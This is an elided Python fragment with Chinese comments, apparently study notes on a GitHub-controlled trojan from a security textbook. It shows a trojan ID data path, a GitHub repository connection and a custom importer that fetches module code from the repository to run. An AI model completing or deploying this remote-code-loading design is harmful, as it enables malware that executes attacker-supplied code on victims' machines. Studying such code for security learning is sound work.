...
data_path = "chapter7/trojan/data/%s/" % trojan_id
trojan_modules = []
configured = False
...
def connect_to_github():
    ...
    repo = gh.repository("你的账号，同上面的账号", "BHP（仓库名）")
...
class GitImporter(object):
    ...
    def find_module(self, fullname, path=None):
        if configured:
            ...
            new_library = get_file_contents("chapter7/trojan/modules/%s" % fullname) #这里填自己的模块地址，可能会有不同
